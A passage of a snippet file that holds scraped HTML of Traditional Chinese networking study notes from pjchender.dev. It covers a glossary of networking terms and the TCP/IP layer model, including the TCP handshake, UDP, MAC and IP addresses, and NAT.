Sharing)</td><td></td></tr><tr><td>sub-interface</td><td><code>分割子介面</code>。</td></tr><tr><td>NIC (Network Interface Card)</td><td><code>網路介面卡</code>。</td></tr><tr><td>NAT (Network Address Translation)</td><td><code>網路位址變換</code>。用來將私網 IP 轉換成公網 IP 的技術。</td></tr><tr><td>NAPT ( Network Address Port Translation)</td><td><code>網路位置連接埠轉換</code>。</td></tr><tr><td>protocol</td><td><code>通訊協定</code>。定義電腦間通訊時所應遵循的規範，就像一群人在討論時，要先規定彼此都要講中文或英文才能順利溝通一樣。通訊協定包含了<code>資料格式</code>和<code>通訊程序</code>這兩個部分。<code>資料格式</code>指的就是要用何種格式來傳送資料；<code>通訊程序</code>用來訂定處理的順序和內容。幾乎沒有一個通訊協定就可以有能力定義所有的通訊作業，<strong>通常在定義一個完整的通訊程序時，會需要多個通訊協定互相搭配運用</strong>，而能夠互相搭配運用的通訊協定組合就稱作「<code>通訊協定家族（Protocol Suite）</code>」。</td></tr><tr><td>IETF (Internet Engineering Task Force)</td><td><code>網際網路工程任務小組</code>。負責網際網路標準的開發和推動。</td></tr><tr><td>RFC (request for comment)</td><td><code>意見請求</code>。是由網際網路工程任務組（IETF）所發布的一系列文件，用以了解網際網路的相關資訊。</td></tr><tr><td>OSI (Open System Interconnection)</td><td><code>開放式系統互連</code>。OSI 參考模型是將電腦所需的功能歸納整理成 7 大階層。</td></tr><tr><td>LAN (Local Area Network)</td><td><code>區域網路</code>。適用於辦公室或家庭等<strong>單一服務據點內</strong>的網路。以前的 LAN 包含許多格式，現在主要是<code>乙太網路</code>，大多為自行架設即可。</td></tr><tr><td>WAN (Wide Area Network)</td><td><code>廣域網路</code>。由路由器分隔之較小網路的集合所組成的大型網路，<strong>據點與據點間</strong>互相連接的網路，大多為電信業者所使用，必須向電信業者申租才能使用，網際網路就是超大型 WAN 的範例。</td></tr><tr><td>an internet</td><td><code>互聯</code>。和<code>網際網路（Internet, the Internet）</code>有所不同，互聯是用來建立大規模網路的一種方法，而透過「互聯」機制所建構的網路則稱為「網際網路」</td></tr><tr><td>IP (Internet Protocol)</td><td><code>網際網路協定</code>。</td></tr><tr><td>IPAM (IP Address Management)</td><td><code>IP 位址管理</code>。</td></tr><tr><td>DMZ (Demilitarized Zone)</td><td><code>非軍事區</code>。</td></tr><tr><td>ISP (Internet Service Provider)</td><td><code>網際網路服務供應商</code>。</td></tr><tr><td>VPN (Virtual Private Network)</td><td><code>虛擬私有網路</code>。</td></tr><tr><td>Intranet</td><td><code>企業內網路</code>。利用 WWW、電子郵件、TCP/IP 等網路技術來架構<strong>組織內的電腦網路</strong>，所使用的伺服器和網路裝置跟網際網路相同。</td></tr><tr><td>Extranet</td><td><code>企業間網路</code>。利用網際網路技術來連接<strong>不同組織的「企業內網路」</strong>，藉以互相進行資料交換處理。</td></tr><tr><td>TCP (Transmission Control Protocol)</td><td><code>傳輸控制通訊協定</code>。</td></tr><tr><td>Broadcast Address</td><td><code>廣播位址</code>。主機位址部分全部為 1 的 IP 位址。</td></tr><tr><td>host</td><td><code>主機</code>。 TCP/IP 網路上的電腦或其他裝置。</td></tr><tr><td>Network Address</td><td><code>網路位址</code>。主機部分全部為 0 的 IP 位址。</td></tr><tr><td>octet</td><td><code>八位元資料組</code>。一個 8 位元數字，四個八位元數字即構成一個 32 位元 IP 位址。它們的範圍是 00000000-11111111，對應至十進位值 0- 255。</td></tr><tr><td>packet</td><td><code>封包</code>。 透過 TCP/IP 網路或廣域網路傳送的資料單位。</td></tr><tr><td>router</td><td><code>路由器</code>。在不同的 IP 網路之間傳送網路流量的裝置。</td></tr><tr><td>Subnet Mask</td><td><code>子網路遮罩</code>。一個 32 位元數字，用來區分 IP 位址的網路部分及主機部分。</td></tr><tr><td>Subnet/ subnetwork</td><td><code>子網路</code>。 藉由將較大網路分成幾個相等部分所建立的較小網路。</td></tr><tr><td>Cascade</td><td><code>串接</code>。將多段交換器互相連接的方式。</td></tr><tr><td>frame</td><td><code>訊框</code>。乙太網路在將資料轉換為電子訊號或光訊號前，會先將資料切割為較小的單位，這個較小的單位就稱作訊框。</td></tr></tbody></table><blockquote><ul><li><a href=\"https://ithelp.ithome.com.tw/articles/10193287\" target=\"_blank\" rel=\"noopener noreferrer\">HTTPS, SSL 加密</a></li><li><a href=\"https://ithelp.ithome.com.tw/articles/10193879\" target=\"_blank\" rel=\"noopener noreferrer\">D-H 迪菲-赫爾曼密鑰交換</a></li></ul></blockquote><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"參考\">參考<a href=\"#參考\" class=\"hash-link\" aria-label=\"參考的直接連結\" title=\"參考的直接連結\">​</a></h2><ul><li><a href=\"https://ithelp.ithome.com.tw/users/20107304/ironman/1258\" target=\"_blank\" rel=\"noopener noreferrer\">鯊魚咬電纜：30 天玩 Wireshark</a> @ IThome</li><li><a href=\"http://www.flag.com.tw/book/5105.asp?bokno=FT176\" target=\"_blank\" rel=\"noopener noreferrer\">MIS 一定要懂的 82 個網路技術知識</a> @ 旗標出版</li></ul></div>",
      "<style>.buttonGroup__atx{display:none;}",
      "pre {background-color: rgb(41,45,62);}</style>"
    ],
    "description": "https://pjchender.dev"
  },
  "hinternet [網際網路] TCP_IP 階層模型-基礎 part 1 pjchender.dev": {
    "prefix": "hinternet [網際網路] TCP_IP 階層模型-基礎 part 1 pjchender.dev",
    "type": "html",
    "isCode": false,
    "body": [
      "<div><h1>[網際網路] TCP_IP 階層模型-基礎 part 1</h1></header><blockquote><p>此文章為各筆記之整理，非原創，擷取來源可見<a href=\"#%E8%B3%87%E6%96%99%E4%BE%86%E6%BA%90\">資料來源</a>。</p></blockquote><blockquote><p>待閱讀：</p><ul><li><a href=\"https://www.jianshu.com/p/6e9e4156ece3\" target=\"_blank\" rel=\"noopener noreferrer\">一篇文章帶你詳解 HTTP 協議（網絡協議篇一）</a></li><li><a href=\"https://www.jianshu.com/p/9f3e879a4c9c\" target=\"_blank\" rel=\"noopener noreferrer\">一篇文章帶你熟悉 TCP/IP 協議（網絡協議篇二）</a></li></ul></blockquote><blockquote><ul><li><a href=\"http://www.flag.com.tw/book/5105.asp?bokno=FT176\" target=\"_blank\" rel=\"noopener noreferrer\">MIS 一定要懂的 82 個網路技術知識</a> @ 旗標出版</li><li><a href=\"https://notfalse.net/66/repeater-hub-bridge-switch\" target=\"_blank\" rel=\"noopener noreferrer\">中繼器 (Repeater)、集線器 (Hub)、橋接器 (Bridge)、交換器 (Switch) 原理與介紹</a> @ !false</li><li><a href=\"https://support.microsoft.com/zh-tw/help/164015/understanding-tcp-ip-addressing-and-subnetting-basics\" target=\"_blank\" rel=\"noopener noreferrer\">了解 TCP/IP 定址及子網路基本概念</a> @ Microsoft Support</li></ul></blockquote><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"tcpip-階層模型\">TCP/IP 階層模型<a href=\"#tcpip-階層模型\" class=\"hash-link\" aria-label=\"TCP/IP 階層模型的直接連結\" title=\"TCP/IP 階層模型的直接連結\">​</a></h2><p>TCP/IP 階層模型由下而上分別為<strong>網路介面層</strong>、<strong>網際網路層</strong>、<strong>傳輸層</strong>、和<strong>應用層</strong>。</p><ul><li><strong>L2 - 資料鏈結層（Link Layer / Data-Link Layer）</strong>：建立通訊作業的裝置，如，乙太網路的網路卡、WiFi。</li><li><strong>L3 - 網際網路層（Internet Layer / Network Layer）</strong>：利用轉送的方式，為任意兩端的裝置建立通訊連線，例如，<code>IP</code>、<code>ICMP</code>。</li><li><strong>L4 - 傳輸層（Transport Layer）</strong>：根據不同的用途提供不同的通訊品質，例如，<code>TCP</code>、<code>UDP</code>。</li><li><strong>L5 - 應用層（Application Layer）</strong>：實際執行通訊服務作業，例如，<code>HTTP</code>、<code>SMTP</code>、<code>POP3</code>。</li></ul><p><img loading=\"lazy\" src=\"../../../i.imgur.com/i2KF8Zc.png\" class=\"img_ev3q\"></p><blockquote><p>圖片來源：<a href=\"https://notfalse.net/66/repeater-hub-bridge-switch\" target=\"_blank\" rel=\"noopener noreferrer\">中繼器 (Repeater)、集線器 (Hub)、橋接器 (Bridge)、交換器 (Switch) 原理與介紹</a> @ !false</p></blockquote><blockquote><p><a href=\"https://zh.wikipedia.org/wiki/TCP/IP协议族\" target=\"_blank\" rel=\"noopener noreferrer\">TCP/IP 協定套組</a> @ Wiki</p></blockquote><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"網路介面層link-layer\">網路介面層（Link Layer）<a href=\"#網路介面層link-layer\" class=\"hash-link\" aria-label=\"網路介面層（Link Layer）的直接連結\" title=\"網路介面層（Link Layer）的直接連結\">​</a></h3><h5 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"keywords-子網路-mac-address-ethernetwi-fipppoe-arprarp\">keywords: <code>子網路</code>, <code>MAC address</code>, <code>Ethernet</code>、<code>Wi-Fi</code>、<code>PPPoE</code>, <code>ARP/RARP</code><a href=\"#keywords-子網路-mac-address-ethernetwi-fipppoe-arprarp\" class=\"hash-link\" aria-label=\"keywords-子網路-mac-address-ethernetwi-fipppoe-arprarp的直接連結\" title=\"keywords-子網路-mac-address-ethernetwi-fipppoe-arprarp的直接連結\">​</a></h5><ul><li>為<strong>直接透過網路硬體裝置連接</strong>的電腦（子網路），建立相互通訊的連線，但不能透過轉送的方式跨越至其他網路（網際網路）。</li><li>在這裡規定了「<strong>幀 (Frame)</strong>」的概念（不是封包），其中表頭的長度固定為 <code>18byte</code>，數據則介於 <code>46 ~ 1500 byte</code>，超過這個長度就會拆成另一幀。</li></ul><blockquote><p><code>幀 = 表頭 (Head) + 數據 (Data)</code></p></blockquote><ul><li><strong>表頭裡面會放發送者和接收者的「MAC 位址」</strong>，這個位址在每台電腦都是不一樣的，透過<strong>廣播（broadcast）</strong>的方式，看看表頭中的接受者和當前拜訪的地址是否吻合（僅適用於<strong>子網路</strong>）。</li></ul><blockquote><p><strong>MAC address</strong> 共由 48 個位元組成，以十六進位的方式表示，前 24 個位元廠商編號，後 24 個為廠商的流水號。例如，<code>a4-5e-60-d0-bb-ff</code>。</p></blockquote><ul><li>最具代表性的通訊協定為乙太網路（Ethernet）、Wi-Fi、PPPoE（PPP over Ethernet，點對點通訊協定）、ARP/RARP。<ul><li><strong>乙太網路（Ethernet）</strong>：有線網路被最廣為使用的規範。</li><li><strong>Wi-Fi</strong>：透過無線方式連結區域網路的規範。</li><li><strong>PPPoE</strong>：在乙太網路上進行一對一連線的通訊協定。</li><li><strong>ARP/RARP</strong>：將 IP 位址和 MAC 位址互相轉換的一種通訊協定。</li></ul></li></ul><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"網際網路層internet-layer\">網際網路層（Internet Layer）<a href=\"#網際網路層internet-layer\" class=\"hash-link\" aria-label=\"網際網路層（Internet Layer）的直接連結\" title=\"網際網路層（Internet Layer）的直接連結\">​</a></h3><h5 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"keywords-ip-icmp-網際網路\">keywords: <code>IP</code>, <code>ICMP</code>, <code>網際網路</code><a href=\"#keywords-ip-icmp-網際網路\" class=\"hash-link\" aria-label=\"keywords-ip-icmp-網際網路的直接連結\" title=\"keywords-ip-icmp-網際網路的直接連結\">​</a></h5><ul><li><strong>有了網路介面層提供的 MAC 位址後，就可以知道要把資料傳輸到子網路內的哪台電腦，</strong>然而 MAC 位址只適用於子網路的通訊，單從 MAC 地址無法得知收件者的子網路為何，因此需要 IP 協定，<strong>透過 IP 位址即可知道該電腦屬於哪一個子網路</strong>。</li><li>將資料轉送到<strong>未直接連接</strong>的其他網路，而將封包轉送到指定的方向就稱作<strong>路由（route）</strong>。</li><li><strong>將資料的表頭加上傳送者和接受者的 IP 位址</strong>，藉以識別所要連線的電腦端點，知道該資料要送到哪個子網路。</li><li>最具代表性的協定為 <strong>IP（Internet Protocol，網際網路通訊協定）</strong>，此協定針對未直接連結的網路，提供封包路由機制，為任意的電腦端點建立通訊連線。</li><li><strong>ICMP（Internet Control Message Protocol，網際網路控制訊息協定）</strong>，用來輔助 IP 協定，能偵測資料是否被送達任意端點，若否，則發送失敗通知。</li></ul><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"傳輸層transport-layer\">傳輸層（Transport Layer）<a href=\"#傳輸層transport-layer\" class=\"hash-link\" aria-label=\"傳輸層（Transport Layer）的直接連結\" title=\"傳輸層（Transport Layer）的直接連結\">​</a></h3><h5 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"keywords-tcp-udp-port\">keywords: <code>TCP</code>, <code>UDP</code>, <code>port</code><a href=\"#keywords-tcp-udp-port\" class=\"hash-link\" aria-label=\"keywords-tcp-udp-port的直接連結\" title=\"keywords-tcp-udp-port的直接連結\">​</a></h5><ul><li>有了網際網路層的 IP 位址之後，就可以把檔案傳輸到目標電腦上，但是<strong>該電腦上有許多不同的應用程式，沒辦法知道這個檔案要由電腦上的哪一個應用程式處理</strong>，因此出現了 <code>port</code> 的概念，提供每一個需要使用到網路的應用程式一個 <code>port</code> 後，即可知道這個檔案要發送到該電腦上的哪一個 <code>port</code>。</li><li>port 是由 16 個位元組成，從 0 ~ 65535，其中的 0 ~ 1023 是給電腦所使用。</li><li>將資料的表頭加上來源端的 port 和接收端的 prot。</li><li><strong>在這個層級傳送的資料才稱作「封包（package）」</strong>。</li><li>根據網際網路層，<strong>為任意的電腦端點建立高可靠性、低錯誤率的通訊服務</strong>。</li></ul><blockquote><p><a href=\"https://ithelp.ithome.com.tw/articles/10205476\" target=\"_blank\" rel=\"noopener noreferrer\">30-11 之 TCP 與 UDP 協議</a> @ iThome</p></blockquote><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"tcp-transmission-control-protocol可靠傳輸\">TCP (Transmission Control Protocol)：可靠傳輸<a href=\"#tcp-transmission-control-protocol可靠傳輸\" class=\"hash-link\" aria-label=\"TCP (Transmission Control Protocol)：可靠傳輸的直接連結\" title=\"TCP (Transmission Control Protocol)：可靠傳輸的直接連結\">​</a></h4><ul><li>最具代表性的協定是 <strong>TCP（Transmission Control Protocol，傳輸控制協定）</strong>，通訊前須先建立「<strong>連線</strong>」，連線完成後可以進行「<strong>通訊</strong>」，通訊完畢後「<strong>中斷連線</strong>」，可處理封包遺失或重複的情況，若傳送資料的請求在一定是前內沒有回應，則會<strong>重新發送</strong>，因此<strong>缺乏即時性</strong>，適用於網頁的 HTTP、郵件的 SMTP 等。</li></ul><div class=\"language-yaml codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-yaml codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># TCP 建立連線：三方交握（Three-Way Handshake）</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token key atrule\">STEP 1</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">:</span><span class=\"token plain\"> 傳送端 </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">-</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">-</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token plain\"> SYN </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">-</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">-</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token plain\"> 接收端</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token key atrule\">STEP 2</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">:</span><span class=\"token plain\"> 接收端 </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">-</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">-</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token plain\"> SYN + ACK </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">-</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">-</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token plain\"> 傳送端</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token key atrule\">STEP 3</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">:</span><span class=\"token plain\"> 傳送端 </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">-</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">-</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token plain\"> ACK </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">-</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">-</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token plain\"> 接收端</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># TCP 中斷連線：四次揮手</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token key atrule\">STEP 1</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">:</span><span class=\"token plain\"> 傳送端 </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">-</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">-</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token plain\"> FIN </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">-</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">-</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token plain\"> 接收端</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token key atrule\">STEP 2</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">:</span><span class=\"token plain\"> 接收端 </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">-</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">-</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token plain\"> FIN + ACK </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">-</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">-</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token plain\"> 傳送端</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token key atrule\">STEP 3</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">:</span><span class=\"token plain\"> 傳送端 </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">-</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">-</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token plain\"> ACK </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">-</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">-</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token plain\"> 接收端</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"udp-user-datagram-protocol---不可靠傳輸\">UDP (User Datagram Protocol) - 不可靠傳輸<a href=\"#udp-user-datagram-protocol---不可靠傳輸\" class=\"hash-link\" aria-label=\"UDP (User Datagram Protocol) - 不可靠傳輸的直接連結\" title=\"UDP (User Datagram Protocol) - 不可靠傳輸的直接連結\">​</a></h4><ul><li><strong>UDP（User Datagram Protocol，使用者資料元協定）</strong>，不會執行任何提高通訊可靠性的動作，不須先建立連線，不需事前準備，隨時可開始通訊，收到資料後馬上交給應用層，適用於影音串流、網路電話、DNS 和 NTP。</li><li>透過 UDP 可以將資料傳輸到特定電腦的應用程式中，但是<strong>不去管對方有沒有收到</strong>，同時收到檔案的順序快能也不同。</li><li>在 UDP 的表頭中會包含有 Port 和檔案的長度（<code>length</code>）</li></ul><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"應用層application-layer\">應用層（Application Layer）<a href=\"#應用層application-layer\" class=\"hash-link\" aria-label=\"應用層（Application Layer）的直接連結\" title=\"應用層（Application Layer）的直接連結\">​</a></h3><h5 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"keywords-http-smtp-pop3-imap4-ftp-ssh-dns-ntp\">keywords: <code>HTTP</code>, <code>SMTP</code>, <code>POP3</code>, <code>IMAP4</code>, <code>FTP</code>, <code>SSH</code>, <code>DNS</code>, <code>NTP</code><a href=\"#keywords-http-smtp-pop3-imap4-ftp-ssh-dns-ntp\" class=\"hash-link\" aria-label=\"keywords-http-smtp-pop3-imap4-ftp-ssh-dns-ntp的直接連結\" title=\"keywords-http-smtp-pop3-imap4-ftp-ssh-dns-ntp的直接連結\">​</a></h5><p>透過應用層的機制，選出傳輸層中適合該應用程式且「符合使用目的」的通訊功能，接著透過該功能對應用程式進行資料處理。其中重要的協定包含：</p><ul><li><strong>HTTP - 網頁存取</strong></li><li><strong>SMTP - 郵件轉送</strong></li><li><strong>POP3 - 取出郵件</strong></li><li><strong>IMAP4 - 讀取郵件</strong></li><li><strong>FTP - 檔案傳輸</strong></li><li><strong>SSH - 傳送字串指令給伺服器並確認結果</strong></li><li><strong>DNS - 網域名稱與 IP 位址轉換</strong></li><li><strong>NTP - 校時</strong></li></ul><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"資料於各層間的傳遞\">資料於各層間的傳遞<a href=\"#資料於各層間的傳遞\" class=\"hash-link\" aria-label=\"資料於各層間的傳遞的直接連結\" title=\"資料於各層間的傳遞的直接連結\">​</a></h2><p>發送端送出資料時，封包會由高層往低層傳遞，在每一層傳遞時會添加<strong>標頭（header）</strong>，所以資料往低層走的時候，封包的大小也跟著變大。當接收端收到資料時，封包會由低層往高層傳遞，在傳遞過程中會刪除標頭，因此封包大小則會越來越小。</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/DvX8cWmc4ca.jpg?1\" alt=\"Imgur\" class=\"img_ev3q\"></p><blockquote><p>圖片來源：<a href=\"http://www.flag.com.tw/book/5105.asp?bokno=FT176\" target=\"_blank\" rel=\"noopener noreferrer\">MIS 一定要懂的 82 個網路技術知識</a> @ 旗標出版</p></blockquote><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"mac-位址media-access-control-access\">MAC 位址（Media Access Control Access）<a href=\"#mac-位址media-access-control-access\" class=\"hash-link\" aria-label=\"MAC 位址（Media Access Control Access）的直接連結\" title=\"MAC 位址（Media Access Control Access）的直接連結\">​</a></h2><p><strong><code>MAC 位址（媒體存取控制位址，Media Access Control Access）</code>用來指派給每個乙太網路等網路硬體裝置的位址</strong>。理論上，每組 MAC 位址都是全世界獨一無二的號碼，又被稱作資料鏈結層的「<strong>實體位址（Physical Address）</strong>」，但實際上有部分的網路產品是可以自行更改 MAC 位址，因此<strong>不見得每台裝置所使用的 MAC 位址都是唯一的</strong>。</p><p>MAC 位址是由 6 組十六進制的數字表示（6 bytes）：</p><div class=\"codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-text codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">4A:00:04:3F:94:87</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><ul><li>前 3 個 bytes 是由 IEEE 分配的組織唯一識別碼 (<a href=\"https://en.wikipedia.org/wiki/Organizationally_unique_identifier\" target=\"_blank\" rel=\"noopener noreferrer\">OUI</a>)，可視為製造商編號。</li><li>後 3 個 bytes 則是製造商分配，通常第 4 個 bytes 是機型編號，最後 2 個 bytes 則是產品序號。</li></ul><blockquote><p>１ bytes = 8 bits = 8 位數的二進制 = 2 位數的十六進制。</p></blockquote><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"ip-位址ip-address\">IP 位址（IP Address）<a href=\"#ip-位址ip-address\" class=\"hash-link\" aria-label=\"IP 位址（IP Address）的直接連結\" title=\"IP 位址（IP Address）的直接連結\">​</a></h2><h5 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"keywords-icann-twnic-napt\">keywords: <code>ICANN</code>, <code>TWNIC</code>, <code>NAPT</code><a href=\"#keywords-icann-twnic-napt\" class=\"hash-link\" aria-label=\"keywords-icann-twnic-napt的直接連結\" title=\"keywords-icann-twnic-napt的直接連結\">​</a></h5><p><strong>「IP 位址」是為了讓網路能透過 IP 協定來識別每一台電腦，因此附加在電腦上的一列編號</strong>。目前使用的 IP 位址有 <strong>IPv4</strong> 和 <strong>IPv6</strong> 這 2 種。</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"ip-的配發\">IP 的配發<a href=\"#ip-的配發\" class=\"hash-link\" aria-label=\"IP 的配發的直接連結\" title=\"IP 的配發的直接連結\">​</a></h3><p>公有 IP 位址採全球性管理，每一台電腦皆有不同的 IP 位址。</p><ul><li><strong>網際網路名稱及號碼指配機構（Internet Corporation for Assigned Names and Numbers, ICANN）</strong>派發特定範圍的 IP 位址給</li><li><strong>區域網際網路註冊機構（Regional Internet Registry, RIR）</strong> ，亞太地區為 APNIC，接者在配發給</li><li><strong>國家級網際網路位址註冊機構（National Internet Registry, NIR）</strong>，台灣為 TWNIC</li><li>或者 APNIC 分配給<strong>本地級網際網路位址註冊機構（Local Internet Registry, LIR）</strong>，例如 ISP 等。</li></ul><p><img loading=\"lazy\" src=\"../../../i.imgur.com/Nrb3IeRc81e.jpg?2\" alt=\"Imgur\" class=\"img_ev3q\"></p><blockquote><p>圖片來源：<a href=\"http://www.flag.com.tw/book/5105.asp?bokno=FT176\" target=\"_blank\" rel=\"noopener noreferrer\">MIS 一定要懂的 82 個網路技術知識</a> @ 旗標出版</p></blockquote><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"公有-ippublic-ip和私有-ipprivate-ip\">公有 IP（Public IP）和私有 IP（Private IP）<a href=\"#公有-ippublic-ip和私有-ipprivate-ip\" class=\"hash-link\" aria-label=\"公有 IP（Public IP）和私有 IP（Private IP）的直接連結\" title=\"公有 IP（Public IP）和私有 IP（Private IP）的直接連結\">​</a></h3><p>全球獨一無二，不會重複的 IP 位置就屬於「公有 IP 位址」。私有 IP 位址內則有部分 IP 位址會互相重複，適用於機關行號或家庭等內部網路，<strong>只要同一個網域內的 IP 位址不重複就能識別電腦</strong>。</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"nat-和-napt私有-ip-與公有-ip-位址間的轉換\">NAT 和 NAPT：私有 IP 與公有 IP 位址間的轉換<a href=\"#nat-和-napt私有-ip-與公有-ip-位址間的轉換\" class=\"hash-link\" aria-label=\"NAT 和 NAPT：私有 IP 與公有 IP 位址間的轉換的直接連結\" title=\"NAT 和 NAPT：私有 IP 與公有 IP 位址間的轉換的直接連結\">​</a></h3><p>在辦公室或家用網路中，可以使用私有 IP 位址（Private IP Address），但若要連上網際網路時，仍必須使用全球唯一的公用 IP 位址（Public IP Address）來表明自己的身份，這時候就必須要使用<strong>位址轉換（Address Translation）</strong>才能連線上網。</p><p>位址轉換大致上有 NAT 和 NAPT 兩種方法：</p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"natnetwork-address-translation網路位址轉譯一對一轉換\">NAT（Network Address Translation，網路位址轉譯）：一對一轉換<a href=\"#natnetwork-address-translation網路位址轉譯一對一轉換\" class=\"hash-link\" 